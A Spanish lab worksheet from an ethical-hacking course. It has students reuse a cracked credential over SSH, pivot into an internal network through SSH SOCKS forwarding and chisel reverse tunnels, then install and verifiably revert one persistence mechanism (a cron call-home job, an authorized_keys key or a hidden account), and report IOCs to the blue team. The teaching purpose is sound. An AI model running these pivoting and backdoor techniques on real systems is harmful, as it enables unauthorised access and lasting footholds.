# Ficha HE-E14 · Cadena: pivotaje + persistencia con reversión verificada (RA4.a,c,d · rúbrica R3)

> Solo VLAN de laboratorio. Reto integrado: se entrega a HE y **a Incidentes (IC)** como caso.
> **Regla innegociable**: toda persistencia se **revierte y se verifica**. Sin la captura de la
> ausencia tras revertir, el entregable **no está completo** (rúbrica R3, higiene operativa).

## Escenario
`pivote-lab` levantado (ver `pivote-lab/README.md`). Tienes:
- `pivote` (172.31.10.10 en DMZ / 172.31.20.10 en interna) — SSH en el puerto 2222 del host.
- `interna-app` (172.31.20.20) — **solo** en la red interna, sin ruta desde tu Kali.

## Parte A — Acceso con credencial reutilizada (RA4.a)
La contraseña `svc-backup:Password1` la **crackeaste en HE-E13**. Úsala para entrar:
```bash
ssh -p 2222 svc-backup@<IP-del-host-pivote>   # contraseña: Password1
hostname; id; ip -4 a | grep 172.31           # confirma doble interfaz
```
Documenta: cómo obtuviste la credencial (reutilización del volcado NTLM) y qué ves del segmento interno.

## Parte B — Pivotaje al segmento interno (RA4.c)
Objetivo: leer la bandera de `http://172.31.20.20/` que **no** alcanzas directamente.

Método principal — **SSH dynamic forward** (SOCKS):
```bash
# desde tu Kali:
ssh -p 2222 -f -N -D 1080 svc-backup@<IP-del-host-pivote>      # túnel SOCKS en 127.0.0.1:1080
curl --socks5-hostname 127.0.0.1:1080 http://172.31.20.20/     # a través del pivote
proxychains -q curl http://172.31.20.20/                        # alternativa con proxychains (socks5 127.0.0.1 1080)
```
Método alternativo — **chisel** (si te piden practicar túnel reverso):
```bash
# en tu Kali (servidor):
chisel server -p 8080 --reverse
# en pivote (cliente, súbelo con scp):
./chisel client <IP-Kali>:8080 R:socks
# -> SOCKS en 127.0.0.1:1080 de tu Kali; luego igual que arriba
```
**[CHECKPOINT]** Pega la **bandera** `FLAG{...}` en tu entregable como prueba del pivotaje.

## Parte C — Persistencia → reversión verificada (RA4.d)
Instala **UN** mecanismo de persistencia en `pivote`, documéntalo, **revíértelo y verifica**.

Elige uno (los tres son revertibles y verificables):
- **cron**: una tarea que llama a casa cada minuto.
- **authorized_keys**: tu clave pública en `~svc-backup/.ssh/authorized_keys` (acceso sin password).
- **usuario oculto / servicio**: crear una cuenta adicional (documéntala para poder borrarla).

Para CADA mecanismo registra, ANTES de revertir:
- **ruta** exacta del artefacto, **contenido**, **hash** (`sha256sum`) y **marca temporal** (`stat`).

Después:
- **revierte** (borra la línea de cron / la clave / el usuario),
- **verifica la ausencia** volviendo a enumerar y **captura la salida vacía**.

## Qué entregar (`NN-HE-E14-cadena.md` + `iocs.csv`)
1. Cadena completa reproducible: acceso → pivotaje (con la bandera) → persistencia.
2. Bloque de **persistencia**: instalación documentada (ruta+hash+timestamp) **y** la
   **evidencia de reversión** (reenumeración que muestra que ya no está).
3. `iocs.csv` para el equipo azul (IC), una fila por indicador. Usa `iocs-plantilla.csv`.
4. Un compañero debe poder **repetir** tu cadena solo con tu documento.

> Sin la evidencia de reversión (paso 2b) el reto se califica como incompleto: es la parte que
> distingue al profesional del que deja una puerta abierta.
